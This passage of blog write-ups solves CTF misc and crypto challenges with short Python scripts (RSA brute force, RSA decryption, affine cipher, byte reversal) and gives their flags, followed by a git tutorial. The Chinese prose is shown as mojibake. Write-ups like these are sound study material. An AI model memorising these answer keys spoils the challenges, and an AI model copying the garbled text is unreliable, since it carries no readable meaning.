çœ‹åˆ°ä»–çš„å‡ç¬‘ï¼Œä½ å°±çœ‹åˆ°äº†flag<br>å¤–åŠ ä¸€ä¸ª<a href="https://pan.baidu.com/s/1biYwPBZSLUX6mMx7laobMQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šivqgï¼‰</p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>æ‰“å¼€é™„ä»¶å›¾ç‰‡å¾ˆæ˜æ˜¾å›¾ç‰‡åº”è¯¥æ˜¯è¢«æ”¹äº†é«˜åº¦ï¼Œäºæ˜¯winhexæ”¹ä¸‹é«˜åº¦ï¼ˆæŠŠ7C-&gt;CEï¼‰ä¾¿å¾—åˆ°äº†flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3419526214.png"></p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote><p>é¢˜ç›®ï¼šæµé‡åˆ†æå¬è¿‡ä¹ˆ<br>å¤–åŠ <a href="https://pan.baidu.com/s/1qkIARq-GYo1ZWtVLbOC4XQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šg99iï¼‰</p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>è¿‡æ»¤http<br>ç¬¬ä¸€ä¸ªå³é”®è¿½è¸ªhttpæµ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3976240940.png"></p><h2 id="babyhttp"><a href="#babyhttp" class="headerlink" title="babyhttp"></a>babyhttp</h2><blockquote><p>é¢˜ç›®ï¼šä½ çŸ¥é“ä»€ä¹ˆæ˜¯ HTTP å—ï¼Ÿï¼ˆä½ é€šè¿‡ä¸€èˆ¬æ–¹å¼æ˜¯æ‰“ä¸å¼€ç½‘ç«™çš„ï¼‰ Hint: The newest.     106.14.153.173 8443</p></blockquote><p>è§£é¢˜æ€è·¯ï¼š</p><h2 id="babysdn"><a href="#babysdn" class="headerlink" title="babysdn"></a>babysdn</h2><blockquote><p>é¢˜ç›®ï¼šç½‘ç»œé¢†åŸŸæœ‰ä¸ªå¾ˆç«çš„ç ”ç©¶é¢†åŸŸå«åšSDNï¼Œé‚£ä¹ˆä½ çŸ¥é“SDNå¯ä»¥åšä»€ä¹ˆå—ï¼Ÿ<br>å¤–åŠ <a href="https://pan.baidu.com/s/1KJNRKfYbQjPKNjbR_TOgAg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š4tqsï¼‰</p></blockquote><p>è§£é¢˜æ€è·¯:</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="è´æ–¯"><a href="#è´æ–¯" class="headerlink" title="è´æ–¯"></a>è´æ–¯</h2><blockquote><p>é¢˜ç›®ï¼šZmxhZ3t0aGlzX2lzX3JlYWlseV9jaGVjazFufQ==</p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>base64ç›´æ¥å¾—åˆ°flag</p><h2 id="BruTE-RSA"><a href="#BruTE-RSA" class="headerlink" title="BruTE_RSA"></a>BruTE_RSA</h2><blockquote><p>é¢˜ç›®ï¼šRSA!!!!RSA!!!!BRUTE TO GET ANSWET!!!!!!!!!!!<br>å¤–åŠ <a href="https://pan.baidu.com/s/1AMINnsbA6RCH2P5qRWa8wg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šs2wjï¼‰</p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>è„šæœ¬ä¸€æŠŠæ¢­å“ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2256587298.png"></p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">    e,n=(<span class="number">65537</span>, <span class="number">28150970547901913019901824364390497053600856369839321617996700606130553862041378369018779003752433356889118526332329074054728613209407037089320809898343953157935211086135010436283805891893636870991411236307901650696221491790470635225076251966300189483160148297407974155121570252648252906976186499329924342873</span>)</span><br><span class="line">    enc = [<span class="number">14765505659704388743616301253113404978973036615434543467291787063794853415443968447959471191502871327842007582193254954935225085964793898246044520718579206673198788548223402073410975385387693589482235535922205342040654898190651699673461841349817879859547738827158993445539388974095437440553515593043557648807</span>, <span class="number">2710029303357232932696197225263692040597986927359269224740812600224998707144266259851604978553286889767425982708691908438984279442981540971935737617354609856642312100797081348174935195638083002333058089328102430432526612805955273581245352312630845237670744276402867230550537275379675828467791243032108754996</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">15645290594995180815865397749136800126080704684884296404807344870555186823350216705796063922278419585484662234210001661578549560411864952462380096494781766394542247609648743673312823946783517115542404474786395934886667795692210287283039316418126796934535150832709500306153601987121172178183970841498331059732</span>, <span class="number">21617442555922665335003358556294294909187675782115332690799733331050423993084437815407074404916831963972996250287968498545085187385399453596033041024572405343861256748315571881946459758027781418048747455833279362845979940372523947345690345032301120487629036754902398646347412656580163307412681787740326750664</span>, <span class="number">19348488683349923919342516509447021301746908048804474589065296857691964147685313468743094214731368033049009363513595472264453418344479015479950114621314151879917864993370204552541811013392195313132212094385213307392785310155965672154730876755558332642480036174252524027472919787968385243506253357608920063714</span>, <span class="number">20629854768856798537062426042570334097651328955665698429979954410631113160492201197690192324881508105172595216229624523572595589920695165876501026993810936392510720968159305964832449680889041278532807173859579419197780294984519222830572413180237776797800176462492384318120546495539728732366110782215071262307</span>, <span class="number">4495435878782180842982598979426848915852309873951905660784792756061068459745710732551595437224048091881417293289266990062187024491087558766616793894302825089791068743147292750307839875294040412901324620528855104301423793144510274139088687721663452221761938305437162345452537045550568167370305116690051809783</span>, <span class="number">7661724340183101803591438713865416768017391036182721504091980175077745408041746171218955895291610457305692166626410041038406057265635459620914206831469173220106400383322269228580211741720875953586267934600483199784699180072179352772979897002989476042210549203971233854410479608166774751479330366431269265143</span>, <span class="number">24345863558959407738249127568820138362115734211146549194534219311913032290216606859385934708675962835857804566049600710875035366973110422262131331932310524891713319358676673958738776644229757625523955354996402750265022578843637525183704187498194489645838490640529841182709661371499013082259193633000753627261</span>, <span class="number">11113777356910731413424023299582648618258376222028450254478672148119889617557563576704932635131420845868165014982665717620845578039880527701593963719893467068820107811384041511295664833904504511210342105242330522375476482706044695838957591685781703894244561607764476555630573446589408768780659378128082633769</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">278354276293884030290100330445865286604723740111170856624965259573282278044823323212960304154629174664076141280100412502135750130875356944835909175355370317285768658282746817782130476757714384697086179400629156643250500432197002583758692394681401772203578628635926749457621478296182304772136118691761841359</span>, <span class="number">26776010333646450951505049676798517095081501649769062476875716987657158152377399163942730185158271646633743195869088200844528079059295287584662315673931850954417499218402302988583172752092835706460505394013520642399572786659316981175560215257281870309157885279753459530446588724712091187670587598328257057843</span>, <span class="number">6299797715315883788568386920153946350102184029350495209512618821428500521839407821906928005187309243941446249274962920569784287027218357127017163201212917410884120132324167402443661321018326446492786599536322735596548965777531626163278557739549793540563082341626824289439450641992070425122260023203460024220</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">5097867843777034076271397095201528351784693372027998615436445410912131141882225577577253530396333413579756394884096318434100382509189974240357351425474190558456256750742731090012822064840481143528081027106843123030275420215136304130321013605031261372665636366377162666476737296028608455229357416005773064242</span>, <span class="number">6299797715315883788568386920153946350102184029350495209512618821428500521839407821906928005187309243941446249274962920569784287027218357127017163201212917410884120132324167402443661321018326446492786599536322735596548965777531626163278557739549793540563082341626824289439450641992070425122260023203460024220</span>, <span class="number">24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449</span>, <span class="number">6299797715315883788568386920153946350102184029350495209512618821428500521839407821906928005187309243941446249274962920569784287027218357127017163201212917410884120132324167402443661321018326446492786599536322735596548965777531626163278557739549793540563082341626824289439450641992070425122260023203460024220</span>, <span class="number">24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449</span>, <span class="number">6299797715315883788568386920153946350102184029350495209512618821428500521839407821906928005187309243941446249274962920569784287027218357127017163201212917410884120132324167402443661321018326446492786599536322735596548965777531626163278557739549793540563082341626824289439450641992070425122260023203460024220</span>, <span class="number">23267174349531278768420819619439317179083929128083924515569762521057285892931325108327037262091624670335579302436476096123152288550738706103166820604983405317430467198343871458522070337902643863890959573514405066297449924638838605501211486861582957963752388608487593217237563529201436917108304692859773404548</span>]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(bytes_to_long(<span class="built_in">chr</span>(j)),e,n) == i:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">    <span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><h2 id="FFRREEQQ-RSA"><a href="#FFRREEQQ-RSA" class="headerlink" title="FFRREEQQ_RSA"></a>FFRREEQQ_RSA</h2><blockquote><p>é¢˜ç›®ï¼šå¬è¯´è¯å¤šçš„äººå®ˆä¸ä½ç§˜å¯†ï¼Ÿ æ³¨æ„ï¼šæœ¬é¢˜çš„ç­”æ¡ˆä¸ä¼šæœ‰ç›´æ¥å½¢å¦‚ flag{i_am_flag} è¿™æ ·çš„ç­”æ¡ˆï¼Œä½†æ˜¯ä½ ä¼šçœ‹åˆ°ç±»ä¼¼çš„å†…å®¹ FLAG IS I AM FLAG åªéœ€è¦æäº¤ flag{I_AM_FLAG} å³å¯<br>å¤–åŠ <a href="https://pan.baidu.com/s/1z-mJy6bg-8JMmRBkBEMbyg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š0z7aï¼‰</p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>æ‰“å¼€output.txtï¼Œå¯ä»¥å‘ç°è¢«åŠ å¯†çš„å­—ç¬¦å†…å®¹ç‰¹åˆ«é•¿ï¼Œå…¶å®ä¹Ÿå°±è¯´æ˜äº†è¿™æ®µå†…å®¹å…¶å®å¯ä»¥ç”¨è¯é¢‘åˆ†ææ¥çŒœæµ‹æ¯ä¸€ä¸ªåŠ å¯†å­—ç¬¦åˆ°åº•æ˜¯å•¥<br>è¿™é‡Œæ³¨æ„ä¸€ç‚¹ï¼Œè¿™é‡Œç”±äºæ²¡æœ‰é™åˆ¶åŠ å¯†çš„ä¸€å®šæ˜¯è‹±æ–‡è¿™é‡Œå‡ºç°é¢‘ç‡æœ€é«˜çš„å…¶å®æ˜¯ç©ºæ ¼ã€‚é€šè¿‡è„šæœ¬çš„æ–¹å¼å°†å¯†æ–‡å†…å®¹æ›¿æ¢æˆæ¯”è¾ƒç®€å•çš„å­—ç¬¦å½¢å¼ï¼ˆRSAèƒ½å¤Ÿä¿è¯æ¯ä¸ªasciiå­—ç¬¦åŠ å¯†å¾—åˆ°çš„å¯†æ–‡æ˜¯ä¸é‡å¤çš„ï¼‰ï¼Œç„¶åå°±èƒ½å¤Ÿé€šè¿‡åˆ†æå­—ç¬¦å‡ºç°é¢‘ç‡æ¥åˆ†æå¯†æ–‡å•¦ã€‚<br><a href="http://quipqiup.com/index.php"><strong>ç‚¹æˆ‘</strong></a></p><blockquote><p>DONBT STARVE IS A MARVELOUS SURVIVAL GAMEZTHE GAME OPENS WITH MAXWELL SNIDELY COMMENTING ON THE PLAYERBS GAUNT APPEARANCE AND INCLUDES LITTLE FURTHER STORYZTHE GAMEBS SETUP IS TOLD FURTHER THROUGH ITS TRAILERJ ON A DARK AND STORMY NIGHT[ WILSON APPEARS TO E GETTING NOWHERE IN A CHEMISTRY EXPERIMENT UNTIL HE IS STARTLED Y HIS RADIO SPEAKING TO HIMZ IT REVEALS THAT IT HAS NOTICED HIS TROULE AND HAS SECRET KNOWLEDGE OF HIMZ WHEN HE EAGERLY AGREES[ A FLURRY OF E]UATIONS AND DIAGRAMS ENCIRCLE HIM AND FILL HIS HEADZ USING WHITE RATS[ A TYPEWRITER[ AND HIS LOOD AMONG OTHER TOOLS AND MATERIALS[ WILSON CREATES A GIANT MACHINEZ THE RADIO COMMENDS HIS WORK AND TELLS HIM TO PULL THE MACHINEBS SWITCHZ HE HESITATES[ UT AT THE RADIOBS INSISTENCE[ HE DOES SOZ THE MACHINE RATTLES VIOLENTLY[ AND A PAIR OF GHOSTLY ARMS WHISK HIM INTO A DIFFERENT WORLD WHILE AN APPARITION OF MAXWELL CACKLESZTHE FLAG IS THIS IS ALSO FAKE RSA</p></blockquote><p>æœ€åçœ‹åˆ°FLAG IS THIS IS ALSO FAKE RSA<br>å¾—åˆ°flagï¼šflag{THIS_IS_ALSO_FAKE_RSA}</p><h2 id="RREAL-RSA"><a href="#RREAL-RSA" class="headerlink" title="RREAL_RSA"></a>RREAL_RSA</h2><blockquote><p>é¢˜ç›®ï¼šI AM RSA<br>å¤–åŠ <a href="https://pan.baidu.com/s/1-nX-OwYxB084CdYWpzAQ3Q"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šifs4ï¼‰</p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>ç”¨yafuç®—å‡ºpï¼Œqï¼Œè„šæœ¬ä¸€æŠŠæ¢­å“ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4184594191.png"></p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">1106081963347301781444155926534938643298217639670251381867474826890728970307</span></span><br><span class="line">p = <span class="number">167622749606696848477732277529837832463</span></span><br><span class="line">q = <span class="number">6598638704725743849027686163703739789</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">681873475888907291485502809441689140305197371659486141705279050132490452420</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h2 id="Certificate-Authority"><a href="#Certificate-Authority" class="headerlink" title="Certificate Authority"></a>Certificate Authority</h2><blockquote><p>é¢˜ç›®ï¼šåœ†é”¥æ›²çº¿ï¼ŸåŒæ›²çº¿ï¼Ÿè¿˜æ˜¯æ¤­åœ†æ›²çº¿ï¼Ÿä¸è¿‡é¦–å…ˆå¾—ä»è¯ä¹¦é‡Œé¢æ‰¾ç‚¹çº¿ç´¢å‘€<br>å¤–åŠ <a href="https://pan.baidu.com/s/1H3THVKKvY4tiMe9q4xa_CA"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šsiudï¼‰</p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>è€ƒæŸ¥åŠ å¯†ç®—æ³•ï¼šMenezes-Vanstone cryptosystem</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NUAACTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitåŸºæ“</title>
      <link href="2020/05/28/git%E5%9F%BA%E6%93%8D/"/>
      <url>2020/05/28/git%E5%9F%BA%E6%93%8D/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šç”±äºå‘ç°ä¹‹å‰ä¸€ä¸ªé™„ä»¶è¢«æŸç›˜åƒæ‰äº†ï¼ˆè¿˜å¥½æœ‰å¤‡ä»½ï¼Œäºæ˜¯å°±é€‰æ‹©äº†ä¸Šä¼ åˆ°githubä¸Šï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ï¼Œå¤§ä½¬å‹¿å–·~</p></blockquote><p>é¦–å…ˆCreate repository<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2436960897.png"></p><p>æ¥ç€æ‰¾åˆ°è‡ªå·±å–œæ¬¢çš„ç£ç›˜ä½ç½®ï¼Œæ‰“å¼€git baseï¼Œè¾“å…¥git clone <a href="https://github.com/SMU-harvey/Harvey.git">https://github.com/SMU-harvey/Harvey.git</a><br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3668292680.png"></p><p>æ‰“å¼€å¯¹åº”ä½ç½®æ˜¾ç¤ºå‡ºgitçš„æ–‡ä»¶å¤¹å³ä¸ºæˆåŠŸï¼Œç„¶åå°†æƒ³è¦ä¸Šä¼ çš„æ–‡ä»¶æ”¾è¿›å»å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3202497770.png"></p><p>æœ€åè¾“å…¥ä»¥ä¸‹ä¸‰è¡Œå‘½ä»¤å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;æäº¤çš„æè¿°&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2906346618.png"></p><p>è¿™æ—¶ä½ å°±å¯ä»¥æˆåŠŸè®¿é—®æ­¤ç½‘ç«™ï¼Œä¸‹è½½ä½ ä¸Šä¼ çš„æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1903117362.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF 2020</title>
      <link href="2020/05/25/2020GKCTF/"/>
      <url>2020/05/25/2020GKCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="å°å­¦ç”Ÿçš„å¯†ç å­¦"><a href="#å°å­¦ç”Ÿçš„å¯†ç å­¦" class="headerlink" title="å°å­¦ç”Ÿçš„å¯†ç å­¦"></a>å°å­¦ç”Ÿçš„å¯†ç å­¦</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1763095233.png"></p><p><a href="https://blog.csdn.net/x_yhy/article/details/83756908?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-4"><strong>å‚è€ƒæ–‡ç« </strong></a></p><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>é€šè¿‡è¿™ç¯‡å¸–å­çŸ¥é“äº†ä»¿å°„å¯†ç ï¼Œä½†æ˜¯æˆ‘ä¸ä¼šå†™è¿™è„šæœ¬ï¼Œé€šè¿‡æ‰‹å·¥è§£å‡ºæ¥çš„æ˜æ–‡ï¼Œå­—å¤ªä¸‘æ‰‹ç¨¿å°±ä¸å‘å‡ºæ¥äº†<br>æœ€åbase64ä¸€è½¬å°±å‡ºæ¥æœ€ç»ˆçš„flagäº†<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/425020404.png"></p><h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>æ”¹ç¼–äº†æŸå¤§ä½¬çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affine</span>(<span class="params">a,b</span>):</span></span><br><span class="line">  pwd = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    pwd_dic[<span class="built_in">chr</span>(((a*i+b)%<span class="number">26</span>+<span class="number">97</span>))] = <span class="built_in">chr</span>(i+<span class="number">97</span>)</span><br><span class="line">  <span class="keyword">return</span> pwd_dic</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  pwd_dic = &#123;&#125;</span><br><span class="line">  pwd = <span class="string">&#x27;welcylk&#x27;</span></span><br><span class="line">  pwd = pwd.lower()</span><br><span class="line">  plain = []</span><br><span class="line">  pwd_dic = affine(<span class="number">11</span>,<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">      plain.append(pwd_dic[i])</span><br><span class="line">  <span class="built_in">print</span> (<span class="string">&quot;Flag is :&quot;</span> + <span class="string">&quot;&quot;</span>.join(plain))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2611462777.png"></p><h2 id="PokeÌmon"><a href="#PokeÌmon" class="headerlink" title="PokeÌmon"></a>PokeÌmon</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2330892157.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/388820451.png"></p><p>ï¼ˆè¿™æç¤ºçœ‹ä¸å‡ºæ¥æœ‰å•¥ç”¨~<br> <a href="https://pan.baidu.com/s/1AiZScErID_wGU3fxL9GEqQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šamlxï¼‰</p><p>ä¸€å¼€å§‹ç”¨å¤„ç†å™¨å¼€å¤–æŒ‚å‘ç°å¹¶æ²¡å•¥ç”¨ï¼Œå°±ä¸€ç›´æ‰“åˆ°æ»¡çº§éƒ½æ²¡è§ç€flag<br>åæ¥æ ¹æ®é¢˜ç›®ç”¨äº†ä¼ è¯´ä¸­çš„é‡‘æ‰‹æŒ‡åˆ°çš„103é“è·¯ï¼Œä¸€å¼€å§‹è¿˜ä»¥ä¸ºåˆå¤±è´¥äº†ï¼Œå®šç›ä¸€çœ‹flagä¸å°±æ˜¯åœ¨103åœ°å›¾ä¸Šï¼Œå°±è¿™æ ·èŠ±äº†ä¸€ä¸‹åˆåšå‡ºäº†è¿™é¢˜<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4201938049.png"></p><blockquote><p>è¿™æ¬¡ä½œä¸ºwebæ‰‹çš„æˆ‘ä¾æ—§æ²¡åšå‡ºwebçš„é¢˜ï¼Œå¸Œæœ›ä¸‹æ¬¡æ¯”èµ›webé¢˜èƒ½å‡ºçš„é˜³é—´ä¸€ç‚¹</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTFäº”æœˆèµ›&amp;&amp;BJDCTF3th 2020</title>
      <link href="2020/05/24/2020DASCTF%E4%BA%94%E6%9C%88%E8%B5%9B/"/>
      <url>2020/05/24/2020DASCTF%E4%BA%94%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1928111371.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1521517348.png"></p><p>ç§‘å­¦ä¸Šç½‘ï¼ŒF12æŸ¥çœ‹é—®å·ç­”æ¡ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1887446240.png"></p><p>è¾“å…¥æ­£ç¡®ç­”æ¡ˆåï¼Œå³å¯å‘ç°å‡ºç°ä¸€ä¸²å­—ç¬¦ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2834624861.png"></p><p>æœ€åè¿åœ¨ä¸€å—å°±æ˜¯æœ€ç»ˆçš„flag</p><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2651224114.png"></p><p>æŠ–è‚©èˆï¼Œå¾ˆéªšçš„é¡µé¢ï¼Œå…ˆæŠŠé™„ä»¶ä¸‹ä¸‹æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1097970678.png"></p><p><a href="https://pan.baidu.com/s/12JmreLhncSY9u9dq4EQ3mQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šm5lvï¼‰<br>æ‰“å¼€é™„ä»¶å‘ç°éœ€è¦å¯†ç ï¼Œé€šè¿‡é˜…è¯»å‚è€ƒæ–‡ç« å¾—åˆ°å¯†ç ï¼šzerowidthcharactersinvisible</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3517458906.png"></p><p>è§£å‹å‡ºæ¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œç„¶å010çœ‹ï¼Œåè½¬hex<br>é™„ä¸Šåè½¬è„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f &#x3D; open(&#39;f14g.png&#39;,&#39;rb&#39;).read()</span><br><span class="line">f2 &#x3D; list(f)</span><br><span class="line">f3 &#x3D; f2[::-1]</span><br><span class="line">#print f3</span><br><span class="line">f4 &#x3D; &#39;&#39;.join(f3)</span><br><span class="line">with open(&#39;f1ag.png&#39;,&#39;wb&#39;) as f:</span><br><span class="line">    f.write(f4)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¼ å¥‡è‘©å›¾ç‰‡ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4194615657.png"></p><p>æ¥ç€ç¡¬æœæ‰¾åˆ°åŠ å¯†æ–¹å¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1575066815.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2912689633.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1773277287.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/704471714.png"></p><p>å†ç»“åˆæ–‡æ¡£æ‰€ç»™çš„æç¤ºå¾—åˆ°æœ€ç»ˆçš„flag<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/507711824.png"></p><h2 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2911746332.png"></p><p><a href="https://pan.baidu.com/s/1kggw00jnKEEO71srmp-wfw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š4pwuï¼‰</p><p>æ‰“å¼€é™„ä»¶ï¼Œå®šç›ä¸€çœ‹å…¶å®å¯ä»¥å‘ç°è¿™å¯èƒ½å°±æ˜¯ä¸ªäºŒç»´ç </p><p><img 